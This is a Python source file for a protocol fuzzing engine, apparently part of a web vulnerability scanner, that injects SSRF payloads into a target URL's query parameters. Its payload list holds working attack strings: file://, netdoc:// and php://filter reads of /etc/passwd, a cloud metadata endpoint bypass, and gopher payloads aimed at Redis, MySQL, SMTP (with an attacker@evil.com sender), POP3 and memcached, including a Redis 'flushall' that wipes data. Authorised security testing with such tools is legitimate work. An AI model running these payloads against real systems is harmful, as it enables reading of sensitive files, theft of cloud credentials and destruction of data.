"""
Protocol Fuzzing Engine - 25+ protocols
"""


class ProtocolFuzzer:
    def __init__(self, config):
        self.config = config
        self.allowed = config.protocols  # None = all

        self.PROTOCOLS = [
            # Basic
            ('http',    'http://127.0.0.1/'),
            ('https',   'https://127.0.0.1/'),
            # File
            ('file',    'file:///etc/passwd'),
            # Dict
            ('dict',    'dict://127.0.0.1:11211/stat'),
            # Gopher - powerful SSRF
            ('gopher',  'gopher://127.0.0.1:6379/_INFO%0d%0a'),
            ('gopher',  'gopher://127.0.0.1:25/_EHLO%20localhost%0d%0a'),
            ('gopher',  'gopher://127.0.0.1:3306/_%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00'),
            # FTP
            ('ftp',     'ftp://127.0.0.1/'),
            # LDAP
            ('ldap',    'ldap://127.0.0.1:389/'),
            ('ldaps',   'ldaps://127.0.0.1:636/'),
            # SFTP
            ('sftp',    'sftp://127.0.0.1/'),
            # TFTP
            ('tftp',    'tftp://127.0.0.1/TESTUDPPACKET'),
            # NetDoc
            ('netdoc',  'netdoc:///etc/passwd'),
            # SMB
            ('smb',     'smb://127.0.0.1/'),
            # Jar
            ('jar',     'jar:http://127.0.0.1!/'),
            # PHP wrappers (for PHP apps)
            ('php',     'php://filter/read=convert.base64-encode/resource=/etc/passwd'),
            ('php',     'php://input'),
            # Data URI
            ('data',    'data://text/plain;base64,SSBsb3ZlIFBIUAo='),
            # SSRF via URL redirect
            ('http-redir', 'http://127.0.0.1@169.254.169.254/'),
            # Tftp/udp
            ('tftp-udp', 'tftp://127.0.0.1:69/TESTUDP'),
            # Pop3
            ('pop3',    'gopher://127.0.0.1:110/1USER%20admin%0d%0a'),
            # SMTP via gopher
            ('smtp',    'gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMail%20From%3Aattacker%40evil.com%0d%0a'),
            # Redis via gopher
            ('redis',   'gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a'),
            # Memcached
            ('memcache','gopher://127.0.0.1:11211/_%0astats%0a'),
        ]

    def build_tasks(self, url):
        tasks = []
        from urllib.parse import urlparse, parse_qs, urlencode
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys()) if parsed.query else ['url']

        if not params:
            params = ['url']

        for proto_name, proto_payload in self.PROTOCOLS:
            if self.allowed and proto_name not in self.allowed:
                continue
            for param in params[:3]:  # limit params for protocol fuzzing
                tasks.append({
                    'type': 'protocol',
                    'url': url,
                    'param': param,
                    'payload': proto_payload,
                    'protocol': proto_name
                })

        return tasks
